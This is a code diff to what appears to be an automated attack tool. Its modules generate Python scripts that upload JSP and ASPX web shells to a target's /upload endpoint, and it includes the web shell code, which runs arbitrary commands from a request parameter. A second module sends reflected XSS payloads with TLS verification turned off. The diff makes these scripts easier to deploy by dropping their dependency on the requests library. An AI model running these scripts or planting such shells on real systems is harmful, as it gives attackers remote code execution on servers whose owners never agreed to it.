@@ -122,7 +122,11 @@ class WebShellUpload(AttackModule):
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
-        return f"""import requests, sys
+        # Phase 2: `requests` is NOT a declared dependency (requirements.txt /
+        # pyproject.toml) -- the old script died with ModuleNotFoundError on a
+        # fresh install. Rewritten with stdlib urllib (multipart hand-rolled,
+        # ~10 lines) so it runs anywhere with zero new deps.
+        return f"""import sys, uuid, urllib.request, urllib.error
 host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
 port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
 scheme = "https" if port in (443, 8443) else "http"
@@ -133,12 +137,25 @@ shells = [
     ("shell.jsp", b"<% Runtime.getRuntime().exec(request.getParameter(\\"cmd\\")); %>", "application/jsp"),
     ("shell.aspx", b"<%@ Page Language=\\"C#\\" %><% System.Diagnostics.Process.Start(\\"cmd.exe\\", \\"/c \\" + Request[\\"cmd\\"]); %>", "application/aspx"),
 ]
+boundary = "----netattackai" + uuid.uuid4().hex
 for filename, content, ctype in shells:
     try:
-        files = {{"file": (filename, content, ctype)}}
-        r = requests.post(f"{{url}}/upload", files=files, timeout=10, allow_redirects=False)
-        if r.status_code in (200, 201, 302):
-            print(f"UPLOAD SUCCESS: {{filename}} (status {{r.status_code}})")
+        body = (
+            f"--{{boundary}}\\r\\n"
+            f'Content-Disposition: form-data; name="file"; filename="{{filename}}"\\r\\n'
+            f"Content-Type: {{ctype}}\\r\\n\\r\\n"
+        ).encode() + content + f"\\r\\n--{{boundary}}--\\r\\n".encode()
+        req = urllib.request.Request(
+            f"{{url}}/upload", data=body, method="POST",
+            headers={{"Content-Type": f"multipart/form-data; boundary={{boundary}}"}},
+        )
+        try:
+            resp = urllib.request.urlopen(req, timeout=10)
+            status = getattr(resp, "status", 200)
+        except urllib.error.HTTPError as e:
+            status = e.code
+        if status in (200, 201, 302):
+            print(f"UPLOAD SUCCESS: {{filename}} (status {{status}})")
             break
     except Exception as e:
         print(f"{{filename}} failed: {{e}}")
@@ -177,12 +194,17 @@ class XSSScanner(AttackModule):
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
-        return f"""import requests, urllib.parse, sys
+        # Phase 2: `requests` is NOT a declared dependency -- rewritten with
+        # stdlib urllib so the generated script runs on a fresh install.
+        return f"""import sys, urllib.request, urllib.parse, urllib.error, ssl
 # Target: {ctx.target_ip}
 host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
 port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
 scheme = "https" if port in (443, 8443) else "http"
 base = f"{{scheme}}://{{host}}:{{port}}"
+ctx_ssl = ssl.create_default_context()
+ctx_ssl.check_hostname = False
+ctx_ssl.verify_mode = ssl.CERT_NONE
 payloads = [
     '''<script>alert('XSS')</script>''',
     '''<img src=x onerror=alert('XSS')>''',
@@ -192,8 +214,10 @@ payloads = [
 for payload in payloads:
     try:
         url = f"{{base}}/search?q={{urllib.parse.quote(payload)}}"
-        r = requests.get(url, timeout=10)
-        if payload in r.text:
+        req = urllib.request.Request(url)
+        resp = urllib.request.urlopen(req, timeout=10, context=ctx_ssl)
+        text = resp.read().decode(errors="replace")
+        if payload in text:
             print(f"XSS REFLECTED: {{payload[:50]}}")
             break
     except Exception as e:
